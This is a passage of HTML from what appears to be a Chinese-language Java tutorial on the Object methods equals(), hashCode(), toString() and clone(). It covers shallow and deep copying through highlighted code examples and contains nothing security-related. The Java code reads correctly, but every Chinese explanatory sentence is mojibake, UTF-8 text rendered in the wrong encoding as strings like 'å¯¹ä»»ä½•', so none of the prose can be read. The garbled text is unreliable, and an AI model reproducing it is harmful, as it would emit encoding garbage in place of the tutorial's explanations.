class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">y</span><span class=\"o\">);</span> <span class=\"o\">//</span> <span class=\"kc\">true</span></code></pre></div><p>â…¤ ä¸ null çš„æ¯”è¾ƒ</p><p>å¯¹ä»»ä½•ä¸æ˜¯ null çš„å¯¹è±¡ x è°ƒç”¨ x.equals(null) ç»“æœéƒ½ä¸º false</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">x</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"kc\">null</span><span class=\"o\">);</span> <span class=\"o\">//</span> <span class=\"kc\">false</span><span class=\"o\">;</span></code></pre></div><p><b>2. ç­‰ä»·ä¸ç›¸ç­‰</b> </p><ul><li>å¯¹äºåŸºæœ¬ç±»å‹ï¼Œ== åˆ¤æ–­ä¸¤ä¸ªå€¼æ˜¯å¦ç›¸ç­‰ï¼ŒåŸºæœ¬ç±»å‹æ²¡æœ‰ equals() æ–¹æ³•ã€‚</li><li>å¯¹äºå¼•ç”¨ç±»å‹ï¼Œ== åˆ¤æ–­ä¸¤ä¸ªå˜é‡æ˜¯å¦å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡ï¼Œè€Œ equals() åˆ¤æ–­å¼•ç”¨çš„å¯¹è±¡æ˜¯å¦ç­‰ä»·ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Integer</span> <span class=\"n\">x</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Integer</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">);</span>\n<span class=\"n\">Integer</span> <span class=\"n\">y</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Integer</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">x</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">y</span><span class=\"o\">));</span> <span class=\"c1\">// true\n</span><span class=\"c1\"></span><span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">x</span> <span class=\"o\">==</span> <span class=\"n\">y</span><span class=\"o\">);</span>      <span class=\"o\">//</span> <span class=\"kc\">false</span></code></pre></div><p><b>3. å®ç°</b> </p><ul><li>æ£€æŸ¥æ˜¯å¦ä¸ºåŒä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ï¼Œå¦‚æœæ˜¯ç›´æ¥è¿”å› trueï¼›</li><li>æ£€æŸ¥æ˜¯å¦æ˜¯åŒä¸€ä¸ªç±»å‹ï¼Œå¦‚æœä¸æ˜¯ï¼Œç›´æ¥è¿”å› falseï¼›</li><li>å°† Object å¯¹è±¡è¿›è¡Œè½¬å‹ï¼›</li><li>åˆ¤æ–­æ¯ä¸ªå…³é”®åŸŸæ˜¯å¦ç›¸ç­‰ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">EqualExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">z</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">EqualExample</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">z</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">x</span> <span class=\"o\">=</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">y</span> <span class=\"o\">=</span> <span class=\"n\">y</span><span class=\"o\">;</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">z</span> <span class=\"o\">=</span> <span class=\"n\">z</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">equals</span><span class=\"o\">(</span><span class=\"n\">Object</span> <span class=\"n\">o</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"k\">this</span> <span class=\"o\">==</span> <span class=\"n\">o</span><span class=\"o\">)</span> <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">o</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">getClass</span><span class=\"o\">()</span> <span class=\"o\">!=</span> <span class=\"n\">o</span><span class=\"o\">.</span><span class=\"na\">getClass</span><span class=\"o\">())</span> <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n\n        <span class=\"n\">EqualExample</span> <span class=\"n\">that</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">EqualExample</span><span class=\"o\">)</span> <span class=\"n\">o</span><span class=\"o\">;</span>\n\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">x</span> <span class=\"o\">!=</span> <span class=\"n\">that</span><span class=\"o\">.</span><span class=\"na\">x</span><span class=\"o\">)</span> <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">y</span> <span class=\"o\">!=</span> <span class=\"n\">that</span><span class=\"o\">.</span><span class=\"na\">y</span><span class=\"o\">)</span> <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n        <span class=\"k\">return</span> <span class=\"n\">z</span> <span class=\"o\">==</span> <span class=\"n\">that</span><span class=\"o\">.</span><span class=\"na\">z</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>hashCode()</h2><p>hashCode() è¿”å›æ•£åˆ—å€¼ï¼Œè€Œ equals() æ˜¯ç”¨æ¥åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç­‰ä»·ã€‚ç­‰ä»·çš„ä¸¤ä¸ªå¯¹è±¡æ•£åˆ—å€¼ä¸€å®šç›¸åŒï¼Œä½†æ˜¯æ•£åˆ—å€¼ç›¸åŒçš„ä¸¤ä¸ªå¯¹è±¡ä¸ä¸€å®šç­‰ä»·ã€‚</p><p>åœ¨è¦†ç›– equals() æ–¹æ³•æ—¶åº”å½“æ€»æ˜¯è¦†ç›– hashCode() æ–¹æ³•ï¼Œä¿è¯ç­‰ä»·çš„ä¸¤ä¸ªå¯¹è±¡æ•£åˆ—å€¼ä¹Ÿç›¸ç­‰ã€‚</p><p>ä¸‹é¢çš„ä»£ç ä¸­ï¼Œæ–°å»ºäº†ä¸¤ä¸ªç­‰ä»·çš„å¯¹è±¡ï¼Œå¹¶å°†å®ƒä»¬æ·»åŠ åˆ° HashSet ä¸­ã€‚æˆ‘ä»¬å¸Œæœ›å°†è¿™ä¸¤ä¸ªå¯¹è±¡å½“æˆä¸€æ ·çš„ï¼Œåªåœ¨é›†åˆä¸­æ·»åŠ ä¸€ä¸ªå¯¹è±¡ï¼Œä½†æ˜¯å› ä¸º EqualExample æ²¡æœ‰å®ç° hasCode() æ–¹æ³•ï¼Œå› æ­¤è¿™ä¸¤ä¸ªå¯¹è±¡çš„æ•£åˆ—å€¼æ˜¯ä¸åŒçš„ï¼Œæœ€ç»ˆå¯¼è‡´é›†åˆæ·»åŠ äº†ä¸¤ä¸ªç­‰ä»·çš„å¯¹è±¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">EqualExample</span> <span class=\"n\">e1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">EqualExample</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n<span class=\"n\">EqualExample</span> <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">EqualExample</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">e2</span><span class=\"o\">));</span> <span class=\"c1\">// true\n</span><span class=\"c1\"></span><span class=\"n\">HashSet</span><span class=\"o\">&lt;</span><span class=\"n\">EqualExample</span><span class=\"o\">&gt;</span> <span class=\"n\">set</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">HashSet</span><span class=\"o\">&lt;&gt;();</span>\n<span class=\"n\">set</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">e1</span><span class=\"o\">);</span>\n<span class=\"n\">set</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">e2</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">set</span><span class=\"o\">.</span><span class=\"na\">size</span><span class=\"o\">());</span>   <span class=\"o\">//</span> <span class=\"n\">2</span></code></pre></div><p>ç†æƒ³çš„æ•£åˆ—å‡½æ•°åº”å½“å…·æœ‰å‡åŒ€æ€§ï¼Œå³ä¸ç›¸ç­‰çš„å¯¹è±¡åº”å½“å‡åŒ€åˆ†å¸ƒåˆ°æ‰€æœ‰å¯èƒ½çš„æ•£åˆ—å€¼ä¸Šã€‚è¿™å°±è¦æ±‚äº†æ•£åˆ—å‡½æ•°è¦æŠŠæ‰€æœ‰åŸŸçš„å€¼éƒ½è€ƒè™‘è¿›æ¥ã€‚å¯ä»¥å°†æ¯ä¸ªåŸŸéƒ½å½“æˆ R è¿›åˆ¶çš„æŸä¸€ä½ï¼Œç„¶åç»„æˆä¸€ä¸ª R è¿›åˆ¶çš„æ•´æ•°ã€‚R ä¸€èˆ¬å– 31ï¼Œå› ä¸ºå®ƒæ˜¯ä¸€ä¸ªå¥‡ç´ æ•°ï¼Œå¦‚æœæ˜¯å¶æ•°çš„è¯ï¼Œå½“å‡ºç°ä¹˜æ³•æº¢å‡ºï¼Œä¿¡æ¯å°±ä¼šä¸¢å¤±ï¼Œå› ä¸ºä¸ 2 ç›¸ä¹˜ç›¸å½“äºå‘å·¦ç§»ä¸€ä½ã€‚</p><p>ä¸€ä¸ªæ•°ä¸ 31 ç›¸ä¹˜å¯ä»¥è½¬æ¢æˆç§»ä½å’Œå‡æ³•ï¼š<code>31*x == (x&lt;&lt;5)-x</code>ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è¿›è¡Œè¿™ä¸ªä¼˜åŒ–ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"nd\">@Override</span>\n<span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">hashCode</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">17</span><span class=\"o\">;</span>\n    <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">31</span> <span class=\"o\">*</span> <span class=\"n\">result</span> <span class=\"o\">+</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n    <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">31</span> <span class=\"o\">*</span> <span class=\"n\">result</span> <span class=\"o\">+</span> <span class=\"n\">y</span><span class=\"o\">;</span>\n    <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">31</span> <span class=\"o\">*</span> <span class=\"n\">result</span> <span class=\"o\">+</span> <span class=\"n\">z</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"n\">result</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>toString()</h2><p>é»˜è®¤è¿”å› ToStringExample@4554617c è¿™ç§å½¢å¼ï¼Œå…¶ä¸­ @ åé¢çš„æ•°å€¼ä¸ºæ•£åˆ—ç çš„æ— ç¬¦å·åå…­è¿›åˆ¶è¡¨ç¤ºã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">ToStringExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">number</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">ToStringExample</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">number</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">number</span> <span class=\"o\">=</span> <span class=\"n\">number</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">ToStringExample</span> <span class=\"n\">example</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ToStringExample</span><span class=\"o\">(</span><span class=\"n\">123</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">example</span><span class=\"o\">.</span><span class=\"na\">toString</span><span class=\"o\">());</span>\n<span class=\"n\">ToStringExample</span><span class=\"nd\">@4554617c</span></code></pre></div><h2>clone()</h2><p><b>1. cloneable</b> </p><p>clone() æ˜¯ Object çš„ protected æ–¹æ³•ï¼Œå®ƒä¸æ˜¯ publicï¼Œä¸€ä¸ªç±»ä¸æ˜¾å¼å»é‡å†™ clone()ï¼Œå…¶å®ƒç±»å°±ä¸èƒ½ç›´æ¥å»è°ƒç”¨è¯¥ç±»å®ä¾‹çš„ clone() æ–¹æ³•ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">CloneExample</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">a</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">b</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n<span class=\"n\">CloneExample</span> <span class=\"n\">e1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">CloneExample</span><span class=\"o\">();</span>\n<span class=\"o\">//</span> <span class=\"n\">CloneExample</span> <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">clone</span><span class=\"o\">();</span> <span class=\"o\">//</span> <span class=\"err\">&#39;</span><span class=\"n\">clone</span><span class=\"o\">()</span><span class=\"err\">&#39;</span> <span class=\"n\">has</span> <span class=\"kd\">protected</span> <span class=\"n\">access</span> <span class=\"n\">in</span> <span class=\"err\">&#39;</span><span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">lang</span><span class=\"o\">.</span><span class=\"na\">Object</span><span class=\"err\">&#39;</span></code></pre></div><p>é‡å†™ clone() å¾—åˆ°ä»¥ä¸‹å®ç°ï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">CloneExample</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">a</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">b</span><span class=\"o\">;</span>\n\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">public</span> <span class=\"n\">CloneExample</span> <span class=\"nf\">clone</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">CloneNotSupportedException</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"n\">CloneExample</span><span class=\"o\">)</span><span class=\"kd\">super</span><span class=\"o\">.</span><span class=\"na\">clone</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">CloneExample</span> <span class=\"n\">e1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">CloneExample</span><span class=\"o\">();</span>\n<span class=\"k\">try</span> <span class=\"o\">{</span>\n    <span class=\"n\">CloneExample</span> <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">clone</span><span class=\"o\">();</span>\n<span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">CloneNotSupportedException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n<span class=\"o\">}</span>\n<span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">lang</span><span class=\"o\">.</span><span class=\"na\">CloneNotSupportedException</span><span class=\"o\">:</span> <span class=\"n\">CloneExample</span></code></pre></div><p>ä»¥ä¸ŠæŠ›å‡ºäº† CloneNotSupportedExceptionï¼Œè¿™æ˜¯å› ä¸º CloneExample æ²¡æœ‰å®ç° Cloneable æ¥å£ã€‚</p><p>åº”è¯¥æ³¨æ„çš„æ˜¯ï¼Œclone() æ–¹æ³•å¹¶ä¸æ˜¯ Cloneable æ¥å£çš„æ–¹æ³•ï¼Œè€Œæ˜¯ Object çš„ä¸€ä¸ª protected æ–¹æ³•ã€‚Cloneable æ¥å£åªæ˜¯è§„å®šï¼Œå¦‚æœä¸€ä¸ªç±»æ²¡æœ‰å®ç° Cloneable æ¥å£åˆè°ƒç”¨äº† clone() æ–¹æ³•ï¼Œå°±ä¼šæŠ›å‡º CloneNotSupportedExceptionã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">CloneExample</span> <span class=\"kd\">implements</span> <span class=\"n\">Cloneable</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">a</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">b</span><span class=\"o\">;</span>\n\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">public</span> <span class=\"n\">Object</span> <span class=\"nf\">clone</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">CloneNotSupportedException</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"kd\">super</span><span class=\"o\">.</span><span class=\"na\">clone</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p><b>2. æµ…æ‹·è´</b> </p><p>æ‹·è´å¯¹è±¡å’ŒåŸå§‹å¯¹è±¡çš„å¼•ç”¨ç±»å‹å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">ShallowCloneExample</span> <span class=\"kd\">implements</span> <span class=\"n\">Cloneable</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">arr</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">ShallowCloneExample</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">arr</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">10</span><span class=\"o\">];</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">arr</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">i</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">set</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">index</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">value</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">value</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">get</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">index</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">];</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">protected</span> <span class=\"n\">ShallowCloneExample</span> <span class=\"nf\">clone</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">CloneNotSupportedException</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"n\">ShallowCloneExample</span><span class=\"o\">)</span> <span class=\"kd\">super</span><span class=\"o\">.</span><span class=\"na\">clone</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">ShallowCloneExample</span> <span class=\"n\">e1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ShallowCloneExample</span><span class=\"o\">();</span>\n<span class=\"n\">ShallowCloneExample</span> <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n<span class=\"k\">try</span> <span class=\"o\">{</span>\n    <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">clone</span><span class=\"o\">();</span>\n<span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">CloneNotSupportedException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n<span class=\"o\">}</span>\n<span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">set</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">,</span> <span class=\"n\">222</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">e2</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">));</span> <span class=\"o\">//</span> <span class=\"n\">222</span></code></pre></div><p><b>3. æ·±æ‹·è´</b> </p><p>æ‹·è´å¯¹è±¡å’ŒåŸå§‹å¯¹è±¡çš„å¼•ç”¨ç±»å‹å¼•ç”¨ä¸åŒå¯¹è±¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">DeepCloneExample</span> <span class=\"kd\">implements</span> <span class=\"n\">Cloneable</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">arr</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">DeepCloneExample</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">arr</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">10</span><span class=\"o\">];</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">arr</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">i</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">set</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">index</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">value</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">value</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">get</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">index</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">];</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">protected</span> <span class=\"n\">DeepCloneExample</span> <span class=\"nf\">clone</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">CloneNotSupportedException</span> <span class=\"o\">{</span>\n        <span class=\"n\">DeepCloneExample</span> <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">DeepCloneExample</span><span class=\"o\">)</span> <span class=\"kd\">super</span><span class=\"o\">.</span><span class=\"na\">clone</span><span class=\"o\">();</span>\n        <span class=\"n\">result</span><span class=\"o\">.</span><span class=\"na\">arr</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">arr</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">];</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">arr</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"n\">result</span><span class=\"o\">.</span><span class=\"na\">arr</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">];</span>\n        <span class=\"o\">}</span>\n        <span class=\"k\">return</span> <span class=\"n\">result</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">DeepCloneExample</span> <span class=\"n\">e1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">DeepCloneExample</span><span class=\"o\">();</span>\n<span class=\"n\">DeepCloneExample</span> <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n<span class=\"k\">try</span> <span class=\"o\">{</span>\n    <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">clone</span><span class=\"o\">();</span>\n<span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">CloneNotSupportedException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n<span class=\"o\">}</span>\n<span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">set</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">,</span> <span class=\"n\">222</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">e2</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">));</span> <span class=\"o\">//</span> <span 